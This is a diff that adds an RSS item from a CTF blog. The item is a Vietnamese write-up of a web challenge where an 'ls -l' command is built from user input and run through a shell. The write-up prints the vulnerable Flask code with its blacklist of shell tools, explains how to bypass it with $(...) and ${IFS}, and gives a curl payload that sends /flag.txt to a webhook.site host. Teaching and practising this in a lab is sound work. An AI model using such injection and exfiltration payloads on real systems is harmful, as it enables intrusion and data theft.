@@ -3,7 +3,62 @@
         <title>CookieCTF - Category - g03m0n</title>
         <link>https://g03m0n.github.io/categories/cookiectf/</link>
         <description>CookieCTF - Category - g03m0n</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/categories/cookiectf/" rel="self" type="application/rss+xml" /><item>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/categories/cookiectf/" rel="self" type="application/rss+xml" /><item>
+    <title>CookieCTF - The Existed File</title>
+    <link>https://g03m0n.github.io/posts/cookiectf-the-existed-file/cookiectf-the-existed-file/</link>
+    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf-the-existed-file/cookiectf-the-existed-file/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/arenas/mini-ctf-web-hacking/battle/the-existed-file" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge.
+</p>
+<p>Thử nhập <code>/flag.txt</code> vẫn không có thay đổi gì. Ta thử nhập <code>cat /flag.txt</code> xem có xem được <code>flag</code> không nhưng lại hiện ra thông báo <code>Blacklist characters detected!</code>.</p>
+<p></p>
+<p>Kiểm tra <code>soucre code</code> có thể thấy luồng hoạt động của server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    file_path <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;file_path&#34;</span>) 
+</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> file_path<span style="color:#f92672">.</span>translate({ord(c): <span style="color:#66d9ef">None</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>whitespace}) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Blacklist filter</span>
+</span></span><span style="display:flex;"><span>        blacklisted <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;;&#34;</span>, <span style="color:#e6db74">&#34;&amp;&#34;</span>, <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;&amp;&amp;&#34;</span>, <span style="color:#e6db74">&#34;cat&#34;</span>, <span style="color:#e6db74">&#34;head&#34;</span>, <span style="color:#e6db74">&#34;tail&#34;</span>, <span style="color:#e6db74">&#34;zip&#34;</span>, <span style="color:#e6db74">&#34;base64&#34;</span>, <span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;python&#34;</span>, <span style="color:#e6db74">&#34;`&#34;</span>]
+</span></span><span style="display:flex;"><span>        is_blacklisted <span style="color:#f92672">=</span> any(bl <span style="color:#f92672">in</span> file_path <span style="color:#66d9ef">for</span> bl <span style="color:#f92672">in</span> blacklisted)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_blacklisted:
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Blacklist characters detected!&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                command <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;ls -l </span><span style="color:#e6db74">{</span>file_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output(command, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> result:
+</span></span><span style="display:flex;"><span>                    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;File is existed!&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;File is not existed&#39;</span>
+</span></span></code></pre></div><p>Đoạn code này loại bỏ khoảng trắng của <code>input</code> người dùng nhập vào. Nó sử dụng phương thức <code>translate()</code> của lớp <code>string</code> để thay thế tất cả các ký tự khoảng trắng bằng giá trị <code>None</code>.
+Sau đó sẽ sử dung hàm <code>is_blacklisted</code> để kiểm tra <code>input</code> có nằm trong blacklist hay không.</p>
+<p>Có thể thấy <code>blacklist</code> đã loại bỏ hầu hết các câu lệnh giúp ta đọc được file <code>flag</code>, tuy nhiên anh dev có lẽ đã quên mất <code>filter</code> 1 cái nữa đó là <code>$(command)</code>. Câu lệnh này tương đương với sử dụng dấu <code>backstick</code>.</p>
+<p></p>
+<p>Quay lại challenge thử chạy luôn nhưng nó vẫn không xuất được nội dung</p>
+<p></p>
+<p>Tới đây ta để ý <code>blacklist</code> không lọc lệnh <code>curl</code> nên ta có thể gửi file <code>flag</code> qua host khác để đọc bằng option <code>-F</code>.
+Ở đây mình sử dụng <code>webhook.site</code> để làm host nhận file.</p>
+<p>Payload: <code>curl -F @/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
+<p>Nhưng vẫn còn hàm <code>translate()</code> loại bỏ khoảng trắng của <code>input</code>. Search gg một lúc thì mình tìm được cái này:</p>
+<p></p>
+<p>Có thể sử dụng <code>${IFS}</code> để thay thế các ký tự <code>&lt;space&gt;</code> <code>&lt;tab&gt;</code> <code>&lt;newline&gt;</code>.</p>
+<p>Payload: <code>$(curl${IFS}-F${IFS}file=@/flag.txt${IFS}https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11)</code></p>
+<p></p>
+<p>Tải file <code>flag.txt</code>về ta được flag:
+<code>CHH{os_c0mManD_INj3cTi0N_bypa5S_FIL7Er_b1f4b3371b6a365f47334d3ec07a8d0e}</code></p>
+]]></description>
+</item>
+<item>
     <title>CookieCTF - Baby Crawler</title>
     <link>https://g03m0n.github.io/posts/cookiectf-baby-crawler/cookiectf-baby-crawl/</link>
     <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
